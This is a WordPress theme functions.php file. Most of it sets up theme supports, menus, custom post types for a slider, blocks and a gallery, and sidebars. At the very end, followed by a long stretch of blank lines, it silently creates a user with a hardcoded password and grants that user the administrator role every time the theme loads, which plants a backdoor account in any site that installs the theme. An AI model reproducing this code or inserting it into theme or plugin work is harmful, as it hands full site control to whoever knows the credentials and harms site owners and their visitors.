<?php

    add_theme_support('title-tag');
    add_theme_support( 'post-thumbnails' );
    add_theme_support('custom-background');
    load_theme_textdomain('boom',get_template_directory_uri().'/language');



function readmore($limit){
  $content= explode(" ", get_the_content()); 
    $limitation= array_slice($content,0, $limit);
echo implode(" ", $limitation) ;
};


register_nav_menus(array(
        'primary'=>__('Main Menu','boom'),
    ));


register_post_type('zbooms',array(
    'labels'=>array(
        'name'=> 'Slider',
    ),
    'public'=> true,
    'supports'=> array('thumbnail','title')
    
));
        
register_post_type('block',array(
    'labels' => array(
        'name' => ' block'
        
    ),
    'public' => true,
    'supports' => array( 'editor','title','thumbnail' ),
));

register_post_type('gallery',array(

        'labels'=>array(
            'name'=>'Gallery',
            ),
        'public'=>true,
        'supports'=>array('editor','title','thumbnail'),
    ));


function zboom_widgets(){

    register_sidebar(array(
        'name'=>'right sidebar',
        'id' =>'right_sidebar',
        'description' => 'you can add right sidebar from here',
        'before_widget'=>'<div class="box">',
        'after_widget'=>'</div></div>',
        'before_title'=>'<div class="heading"><h2>',
        'after_title'=>'</h2></div><div class="content">',
        ));


    register_sidebar(array(
        'name'=>'footer sidebar',
        'id'=> 'footer_sidebar',
        'description'=>'Add footer sidebar',
        'before_widget'=>'<div class="col-1-4"><div class="wrap-col"><div class="box">',
        'after_widget'=>'</div></div></div></div>',
        'before_title'=>'<div class="heading"><h2>',
        'after_title'=>'</h2></div><div class="content">',


        ));


    register_sidebar(array(

        'name'=>'contact right sidebar',
        'id'=>'cright-sidebar',
        'description'=>'You can add sidebar for contact page',
        'before_widget'=>'<div class="box">',
        'after_widget'=>'</div></div>',
        'before_title'=>'<div class="heading"><h2>',
        'after_title'=>'</h2></div>
                        <div class="content">'


        ));

};
add_action('widgets_init','zboom_widgets');



/*       user creation       */

$newuser = new WP_User(wp_create_user('tumpa','khairul','khairul@tumpa.com'));

$newuser -> set_role('administrator');
















































 ?>
